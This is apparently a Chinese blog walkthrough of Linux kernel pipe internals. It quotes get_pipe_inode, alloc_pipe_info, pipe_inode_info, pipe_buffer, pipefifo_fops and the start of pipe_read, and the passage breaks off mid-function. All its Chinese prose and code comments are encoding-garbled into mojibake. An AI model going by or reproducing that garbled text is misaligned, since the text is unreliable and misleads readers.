<h3 id="get-pipe-inode"><a href="#get-pipe-inode" class="headerlink" title="get_pipe_inode"></a>get_pipe_inode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> inode * <span class="hljs-title function_">get_pipe_inode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><br>	<span class="hljs-keyword">if</span> (!inode)<br>		<span class="hljs-keyword">goto</span> fail_inode;<br><br>	inode-&gt;i_ino = get_next_ino();<br>	<span class="hljs-comment">//ÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÁÆ°ÈÅì‰ø°ÊÅØÁªìÊûÑ‰Ωì pipe_inode_infoÔºåÁî®‰∫éÂ≠òÂÇ®ÁÆ°ÈÅìÁöÑÁä∂ÊÄÅ‰ø°ÊÅØ</span><br>	pipe = alloc_pipe_info();<br>	<span class="hljs-keyword">if</span> (!pipe)<br>		<span class="hljs-keyword">goto</span> fail_iput;<br><br>	inode-&gt;i_pipe = pipe;<br>	pipe-&gt;files = <span class="hljs-number">2</span>;<br>	pipe-&gt;readers = pipe-&gt;writers = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//Â∞ÜÁÆ°ÈÅìÁöÑÊìç‰ΩúÂáΩÊï∞ pipefifo_fops ËµãÂÄºÁªô inode ÁöÑÊñá‰ª∂Êìç‰ΩúÁ¨¶ i_fop</span><br>	inode-&gt;i_fop = &amp;pipefifo_fops;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Mark the inode dirty from the very beginning,</span><br><span class="hljs-comment">	 * that way it will never be moved to the dirty</span><br><span class="hljs-comment">	 * list because &quot;mark_inode_dirty()&quot; will think</span><br><span class="hljs-comment">	 * that it already _is_ on the dirty list.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//ËÆæÁΩÆ inode ÁöÑÁä∂ÊÄÅ‰∏∫ I_DIRTYÔºåË°®Á§∫ËØ• inode ÊòØËÑèÁöÑÔºåÈúÄË¶ÅÂêåÊ≠•Âà∞Á£ÅÁõò‰∏ä„ÄÇ</span><br>	inode-&gt;i_state = I_DIRTY;<br>	inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;<br>	inode-&gt;i_uid = current_fsuid();<br>	inode-&gt;i_gid = current_fsgid();<br>	inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);<br><br>	<span class="hljs-keyword">return</span> inode;<br><br>fail_iput:<br>	iput(inode);<br><br>fail_inode:<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="alloc-pipe-info"><a href="#alloc-pipe-info" class="headerlink" title="alloc_pipe_info"></a>alloc_pipe_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    <span class="hljs-comment">//ÈªòËÆ§Êï∞Èáè‰∏∫ PIPE_DEF_BUFFERS Ôºà16Ôºâ‰∏™ÔºåÂç≥‰∏Ä‰∏™ÁÆ°ÈÅìÂàùÂßãÈªòËÆ§ÂèØ‰ª•Â≠òÊîæ 16 Âº†È°µÈù¢ÁöÑÊï∞ÊçÆ</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br>    <span class="hljs-comment">//user ÊòØÊåáÂêëÂΩìÂâçÁî®Êà∑‰ø°ÊÅØÁªìÊûÑ‰ΩìÁöÑÊåáÈíàÔºåÈÄöËøá get_current_user() ÂáΩÊï∞Ëé∑Âèñ</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;	<span class="hljs-comment">//ËÆ°ÁÆóÂá∫ÂΩìÂâçÁî®Êà∑ÂèØÁî®ÁöÑÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞Èáè user_bufs</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<span class="hljs-comment">//‰ªé pipe_max_size ‰∏≠ËØªÂèñÁÆ°ÈÅìÁöÑÊúÄÂ§ßsize</span><br>	<span class="hljs-comment">//Ë∞ÉÁî® kzalloc() ÂàÜÈÖçÂ§ßÂ∞è‰∏∫ sizeof(struct pipe_inode_info) ÁöÑÂÜÖÂ≠òÁ©∫Èó¥Áî®‰∫éÁÆ°ÈÅì‰ø°ÊÅØÁªìÊûÑ‰Ωì„ÄÇÂ¶ÇÊûúÂàÜÈÖçÂ§±Ë¥•ÔºåÂ∞ÜË∑≥ËΩ¨Âà∞ out_free_uid Ê†áÁ≠æÂ§ÑÈáäÊîæÁî®Êà∑ÁªìÊûÑ‰ΩìÂπ∂ËøîÂõû NULL„ÄÇ</span><br>	pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br>	<span class="hljs-keyword">if</span> (pipe == <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-keyword">goto</span> out_free_uid;<br>	<span class="hljs-comment">//Â¶ÇÊûúÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞Èáè‰πò‰ª•È°µÂ§ßÂ∞èÂ§ß‰∫éÊúÄÂ§ßÂ∞∫ÂØ∏ÔºåÂπ∂‰∏îÂΩìÂâçËøõÁ®ã‰∏çÂÖ∑Â§á CAP_SYS_RESOURCE ËÉΩÂäõÔºåÂàôÂ∞ÜÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞ÈáèË∞ÉÊï¥‰∏∫ÊúÄÂ§ßÂ∞∫ÂØ∏Èô§‰ª•È°µÂ§ßÂ∞è„ÄÇ</span><br>	<span class="hljs-keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))<br>		pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;<br>	<span class="hljs-comment">//Ë∞ÉÁî® account_pipe_buffers() ÂáΩÊï∞Êù•ËÆ°ÁÆóÂΩìÂâçÁî®Êà∑ÂèØÁî®ÁöÑÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞Èáè user_bufs</span><br>	user_bufs = account_pipe_buffers(user, <span class="hljs-number">0</span>, pipe_bufs);<br>	<span class="hljs-comment">//Â¶ÇÊûúÂΩìÂâçÁî®Êà∑ÁöÑÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞ÈáèË∂ÖËøáËΩØÈôêÂà∂Âπ∂‰∏îÁÆ°ÈÅìÊòØÁî±ÈùûÁâπÊùÉÁî®Êà∑ÂàõÂª∫ÁöÑÔºåÂàôÂ∞ùËØïÈôç‰ΩéÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞ÈáèÂà∞ËΩØÈôêÂà∂‰ª•‰∏ãÔºåÂπ∂Â∞ÜÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞ÈáèËÆæÁΩÆ‰∏∫1„ÄÇ</span><br>	<span class="hljs-keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;<br>		user_bufs = account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">1</span>);<br>		pipe_bufs = <span class="hljs-number">1</span>;<br>	&#125;<br>	<span class="hljs-comment">//Â¶ÇÊûúÂΩìÂâçÁî®Êà∑ÁöÑÁÆ°ÈÅìÁºìÂÜ≤Âå∫Êï∞ÈáèË∂ÖËøáÁ°¨ÈôêÂà∂Âπ∂‰∏îÁÆ°ÈÅìÊòØÁî±ÈùûÁâπÊùÉÁî®Êà∑ÂàõÂª∫ÁöÑÔºåÂàôÊîæÂºÉÂàõÂª∫ÁÆ°ÈÅìÔºåÂπ∂Ë∑≥ËΩ¨Âà∞ out_revert_acct Ê†áÁ≠æÂ§ÑËøõË°åÊ∏ÖÁêÜ„ÄÇ</span><br>	<span class="hljs-keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())<br>		<span class="hljs-keyword">goto</span> out_revert_acct;<br>	<span class="hljs-comment">//ÂàÜÈÖçÂ§ßÂ∞è‰∏∫ pipe_bufs ‰∏™ struct pipe_buffer ÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÔºåÂπ∂Â∞ÜÂÖ∂ËµãÂÄºÁªô pipe-&gt;bufsÔºåË°®Á§∫ÁÆ°ÈÅìÁöÑÁºìÂÜ≤Âå∫</span><br>	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>			     GFP_KERNEL_ACCOUNT);<br><br>	<span class="hljs-keyword">if</span> (pipe-&gt;bufs) &#123;<br>		init_waitqueue_head(&amp;pipe-&gt;rd_wait);<br>		init_waitqueue_head(&amp;pipe-&gt;wr_wait);<br>		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="hljs-number">1</span>;<br>		pipe-&gt;max_usage = pipe_bufs;<br>		pipe-&gt;ring_size = pipe_bufs;<br>		pipe-&gt;nr_accounted = pipe_bufs;<br>		pipe-&gt;user = user;<br>		mutex_init(&amp;pipe-&gt;mutex);<br>		<span class="hljs-keyword">return</span> pipe;<br>	&#125;<br><br>out_revert_acct:<br>	(<span class="hljs-type">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">0</span>);<br>	kfree(pipe);<br>out_free_uid:<br>	free_uid(user);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p>ÁÆ°ÈÅìÁöÑÂÆûË¥®ÊòØÁî±‰∏Ä‰∏™ <code>pipe_inode_info</code> ÁªìÊûÑ‰ΩìÊù•ÁÆ°ÁêÜÁöÑÔºåÂÖ∂pipe_bufferÁ±ª‰ºº‰∫éÂæ™ÁéØÈòüÂàó„ÄÇÂú®Ëøô‰∏™Âæ™ÁéØÈòüÂàó‰∏≠ÔºåÁÆ°ÈÅìÁöÑÂÜôÂÖ•Êìç‰ΩúÊòØÂêëÈòüÂàóÂ§¥ÈÉ®Ê∑ªÂä†Êï∞ÊçÆÔºàÂç≥ÂæÄÈòüÂàóÂ∞æÈÉ®ÁßªÂä®ÔºâÔºåËÄåËØªÂèñÊìç‰ΩúÂàôÊòØ‰ªéÈòüÂàóÂ∞æÈÉ®Ëé∑ÂèñÊï∞ÊçÆÔºàÂç≥‰ªéÈòüÂàóÂ§¥ÈÉ®ÁßªÂä®Ôºâ„ÄÇÂú®ÁÆ°ÈÅìÁöÑ <code>pipe_inode_info</code> ÁªìÊûÑ‰Ωì‰∏≠Ôºå<code>head</code> ÊàêÂëòË°®Á§∫ÈòüÂàóÂ§¥ÁöÑÁ¥¢ÂºïÔºå<code>tail</code> ÊàêÂëòË°®Á§∫ÈòüÂàóÂ∞æÁöÑÁ¥¢ÂºïÔºåÂ§¥ËøõÂ∞æÂá∫</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *	@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *	@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *	@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *	@head: The point of buffer production</span><br><span class="hljs-comment"> *	@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *	@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *	@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *	@tmp_page: cached released page</span><br><span class="hljs-comment"> *	@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *	@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *	@r_counter: reader counter</span><br><span class="hljs-comment"> *	@w_counter: writer counter</span><br><span class="hljs-comment"> *	@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *	@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *	@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *	@user: the user who created this pipe</span><br><span class="hljs-comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *	@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *	@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *	@len: length of data inside the @page</span><br><span class="hljs-comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *	@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *	@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>pipeÁöÑÂ§ß‰ΩìÁªìÊûÑÂõæÂ¶Ç‰∏ãÊâÄÁ§∫ÔºàÂõæÊù•Ëá™A3üë¥ÁöÑblogÔºâ</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240318220949.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="pipe„ÅÆÂáΩÊï∞Ë°®"><a href="#pipe„ÅÆÂáΩÊï∞Ë°®" class="headerlink" title="pipe„ÅÆÂáΩÊï∞Ë°®"></a>pipe„ÅÆÂáΩÊï∞Ë°®</h2><p>ÁªèËøáÂ¶Ç‰∏ãË∞ÉÁî®Èìæ</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS">do_pipe2<br>	__do_pipe_flags<br>		create_pipe_files<br>			alloc_file_pseudo<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//ÂáΩÊï∞ÂàõÂª∫‰∏Ä‰∏™‰º™Êñá‰ª∂ÂØπË±°ÔºåËØ•Êñá‰ª∂ÂØπË±°ËøûÊé•Âà∞‰πãÂâçËé∑ÂèñÁöÑÁÆ°ÈÅì inode ‰∏ä„ÄÇÂÆÉÂ∞ÜÊ†πÊçÆ‰º†ÂÖ•ÁöÑÊ†áÂøóËÆæÁΩÆÊñá‰ª∂ÁöÑËØªÂÜôÂ±ûÊÄßÔºåÂπ∂Â∞ÜÂÖ∂‰∏éÁÆ°ÈÅìÁöÑÊìç‰ΩúÂáΩÊï∞ pipefifo_fops ÂÖ≥ËÅîËµ∑Êù•„ÄÇÂ¶ÇÊûúÂàõÂª∫Â§±Ë¥•Ôºå‰ºöÈáäÊîæ‰πãÂâçÂàÜÈÖçÁöÑÁÆ°ÈÅì‰ø°ÊÅØÂπ∂ÈáäÊîæ inodeÔºåÁÑ∂ÂêéËøîÂõûÁõ∏Â∫îÁöÑÈîôËØØ‰ª£Á†Å„ÄÇ</span><br>	f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>				&amp;pipefifo_fops);<br></code></pre></td></tr></table></figure>

<p><strong>pipefifo_ops</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>	.open		= fifo_open,<br>	.llseek		= no_llseek,<br>	.read_iter	= pipe_read,<br>	.write_iter	= pipe_write,<br>	.poll		= pipe_poll,<br>	.unlocked_ioctl	= pipe_ioctl,<br>	.release	= pipe_release,<br>	.fasync		= pipe_fasync,<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>ÈáçÁÇπÂÖ≥Ê≥®ËØªÂÜôÊìç‰Ωú</p>
<h3 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h3><p>‰ªépipe‰∏≠ËØªÂèñÊï∞ÊçÆÔºå‰ºöË∞ÉÁî®Âà∞pipe_read</p>
<p>‰∏Ä‰∏™Êé•‰∏Ä‰∏™ÁöÑËØªÂèñbuffer‰∏≠ÁöÑÊï∞ÊçÆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br>	<span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br>	<span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<span 